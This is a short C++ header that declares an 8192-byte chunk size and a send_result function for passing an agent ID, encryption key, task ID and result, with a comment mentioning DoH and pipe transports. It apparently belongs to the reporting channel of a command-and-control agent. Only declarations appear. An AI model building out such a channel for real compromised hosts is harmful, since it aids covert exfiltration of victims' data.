#pragma once
#include <cstddef>
#include <cstdint>
#include <string>
#include <string_view>

namespace chunked {

// Pre-encryption chunk size; tune down for DoH/pipes.
constexpr std::size_t k_chunk_size = 8192;

bool send_result(std::string_view agent_id, const std::uint8_t key[32],
                 std::string_view task_id, std::string_view result);

} // namespace chunked
